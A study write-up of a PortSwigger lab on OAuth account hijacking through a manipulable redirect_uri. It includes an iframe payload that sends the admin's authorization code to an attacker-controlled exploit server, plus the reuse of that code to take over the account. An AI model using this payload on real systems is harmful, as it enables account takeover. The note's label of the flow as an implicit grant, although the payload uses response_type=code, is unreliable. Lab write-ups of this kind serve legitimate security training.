---
{"dg-publish":true,"permalink":"/port-swigger/bscp-path/o-auth-account-hijacking-via-redirect-uri/","tags":["oauth","hijack","redirecturi","burpsuite","offensivesecurity","ethicalhacking","bscp"],"created":"2026-03-28T20:07:06.046+01:00","updated":"2026-04-07T10:26:43.271+02:00","dg-note-properties":{"tags":["oauth","hijack","redirecturi","burpsuite","offensivesecurity","ethicalhacking","bscp"]}}
---



## Terminology

- **Client application** - The website or web application that wants to access the user's data.
- **Resource owner** - The user whose data the client application wants to access.
- **OAuth service provider** - The website or application that controls the user's data and access to it. They support OAuth by providing an API for interacting with both an authorization server and a resource server.

## How do OAuth authentication vulnerabilities arise?

OAuth authentication vulnerabilities arise partly because the OAuth specification is relatively vague and flexible by design. Although there are a handful of mandatory components required for the basic functionality of each grant type, the vast majority of the implementation is completely optional. This includes many configuration settings that are necessary for keeping users' data secure. In short, there's plenty of opportunity for bad practice to creep in.

One of the other key issues with OAuth is the general lack of built-in security features. The security relies almost entirely on developers using the right combination of configuration options and implementing their own additional security measures on top, such as robust input validation. As you've probably gathered, there's a lot to take in and this is quite easy to get wrong if you're inexperienced with OAuth.

Depending on the grant type, highly sensitive data is also sent via the browser, which presents various opportunities for an attacker to intercept it.

## Identifying OAuth authentication

Recognizing when an application is using OAuth authentication is relatively straightforward. If you see an option to log in using your account from a different website, this is a strong indication that OAuth is being used.

The most reliable way to identify OAuth authentication is to proxy your traffic through Burp and check the corresponding HTTP messages when you use this login option. Regardless of which OAuth grant type is being used, the first request of the flow will always be a request to the `/authorization` endpoint containing a number of query parameters that are used specifically for OAuth. In particular, keep an eye out for the `client_id`, `redirect_uri`, and `response_type` parameters. For example, an authorization request will usually look something like this:

`GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 Host: oauth-authorization-server.com`

## Description

This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete the user `carlos`.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in with your own social media account using the following credentials: `wiener:peter`.

## Objectives

* Steal an authorization code from the admin
* Access their account with that code
* Delete the user **carlos**


-----------

![](/img/user/Attachments/auth_request.png)

So, here is the `authorisation request` and there are parameters visible in the URI confirming oauth:
	1. client_id
	2. redirect_uri
	3. response_type
	4. scope

> No *state* parameter - CSRF is an exploit option?

![](/img/user/Attachments/oauth-callback.png)


Here is the oauth-callback with my `authorisation code`

**Exploit Server URL**
`exploit-0af70010045db28080937aeb010e00af.exploit-server.net`

This endpoint merely displays a simple message when visiting the page. This is where the victim will visit.  

![](/img/user/Attachments/exploit-url-body.png)

On the exploit server page there is a **body** field where the "hello world" must be replaced by the payload. What goes in this field dictates what is displayed on the `payload url`.  

## Payload Crafting

**Payload URL**
```
<iframe src="https://oauth-0a39006d043ab24180cc79af02b700be.oauth-server.net/auth?client_id=olybqhd8ypxndl16nvbwv&redirect_uri=https://exploit-0af70010045db28080937aeb010e00af.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```


**Admin Access Code:** `___qbo60mqTPzaKYFOirXI04dii0VoIi6kx8dq4UQ5k`

```
# Using admin's code 

https://0a8900f7045cb242808c7bc000de007b.web-security-academy.net/oauth-callback?code=ADMIN_CODE

# Payload with Code
https://0a8900f7045cb242808c7bc000de007b.web-security-academy.net/oauth-callback?code=___qbo60mqTPzaKYFOirXI04dii0VoIi6kx8dq4UQ5k
```

--------

## Payload - Breakdown

**`<iframe src="...">`**

An invisible embedded frame that loads a URL silently in the background. When admin visits the exploit page their browser automatically loads whatever is in the src attribute without them seeing it.

**`oauth-0a39006d043ab24180cc79af02b700be.oauth-server.net/auth`**

The OAuth server's authorization endpoint — this is where OAuth login requests go. 

**`client_id=olybqhd8ypxndl16nvbwv`**

Identifies which application is requesting authorization

**`redirect_uri=https://exploit-0af70010045db28080937aeb010e00af.exploit-server.net`**

This is the attack — normally this would be: 
redirect_uri=https://LAB-ID.web-security-academy.net/oauth-callback



---------

## Exploit Process

![](/img/user/Attachments/access-log-before-payload.png)

Here the **Access Log** shows the traffic from before the payload is delivered to the victim.

![](/img/user/Attachments/payload-stored.png)

The payload has been stored in the **body** field and is ready to be delivered to the victim. 

![](/img/user/Attachments/view-payload.png)

This is what the victim will see when victim visits the **payload url**. 

![](/img/user/Attachments/access-log-after-payload.png)

In the **Access Log** it is seen  that the exploit worked given that the IP `10.0.4.178` is seen making a request to the **payload url**. The *Authorisation Code* is revealed in the URL due to this vulnerabililty being a **implicit grant type** and no additional security configurations have been made.

![](/img/user/Attachments/acc-log2.png)

A closer look at the **Access Log** and the admin's requests. 


![](/img/user/Attachments/carlos.png)

The exploit is a success and the authorisation code from admin is achieved and thus access to the admin panel is granted. Now time to delete the user carlos and complete the lab. 